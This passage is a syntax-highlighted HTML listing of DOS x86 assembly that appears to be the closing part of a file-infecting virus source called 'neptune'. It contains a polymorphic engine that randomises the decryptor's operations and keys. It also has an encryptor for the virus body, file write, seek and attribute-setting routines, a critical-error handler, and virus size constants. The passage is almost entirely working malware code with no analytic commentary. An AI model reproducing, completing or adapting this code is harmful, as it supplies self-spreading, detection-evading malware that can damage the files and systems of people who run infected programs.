                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_store</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                          </span><span class="sc1">; +8h = xor</span><span class="sc0">
</span><span class="sc5">ok_store</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">modifyer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">     </span><span class="sc1">; change operand</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                              </span><span class="sc1">; and operation</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">opera</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">        </span><span class="sc1">; for encryption</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">modifyer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">opera</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">operator</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; mov operand,</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">operator</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">encryption</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">change_counter</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">change_counter</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">change_counter</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decrement</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; dec counter</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; mov counter,size</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">dec_crea</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finished_change</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dec_crea</span><span class="sc0">
</span><span class="sc5">finished_change</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decrypt_loop</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; oper [mem],operand</span><span class="sc0">

</span><span class="sc1">; main operation</span><span class="sc0">
</span><span class="sc5">main_oper</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">; xor, sub or add</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">main_oper</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; al = 01h = add</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_do_add</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">          </span><span class="sc1">; al = 29h = sub</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_do_add</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">          </span><span class="sc1">; al = 31h = xor</span><span class="sc0">

</span><span class="sc5">ok_do_add</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decrypt_loop</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; store main oper</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">          </span><span class="sc1">; generate the adeguate encryption</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_reverse</span><span class="sc0">      </span><span class="sc1">; for xor use xor</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; for add use sub</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_reverse</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">         </span><span class="sc1">; for sub use add ;)</span><span class="sc0">
</span><span class="sc5">ok_reverse</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_register</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_register</span><span class="sc0">     </span><span class="sc1">; no SP</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">encryptor</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">; dx = offset</span><span class="sc0">
                </span><span class="sc1">; cx = bytes size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; source</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; to words</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; copy body</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">encryption</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">; will be changed by poly</span><span class="sc0">
</span><span class="sc5">enc_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">opera</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; change operator</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; next word</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">enc_loop</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">write_oper</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; write to file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">go_body_pos</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">; if C  set then seek to end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; if NC go to 0:DX from start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_seek_end</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
</span><span class="sc5">no_seek_end</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">attrib_set</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">        </span><span class="sc1">; set attributes</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">int_24handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; EQUs ---</span><span class="sc0">
</span><span class="sc5">para_virus</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end_mem</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">virus_words</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end_mem</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_nopoly</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">old_24off</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; int 24h offset</span><span class="sc0">
</span><span class="sc5">old_24seg</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; int 24h segment</span><span class="sc0">

</span><span class="sc5">filedate</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; file date</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; file time</span><span class="sc0">

</span><span class="sc5">last_four</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc0">             </span><span class="sc9">dup</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; last five bytes</span><span class="sc0">

</span><span class="sc5">file_buffer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_end_mem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">neptune</span><span class="sc0">         </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">             </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
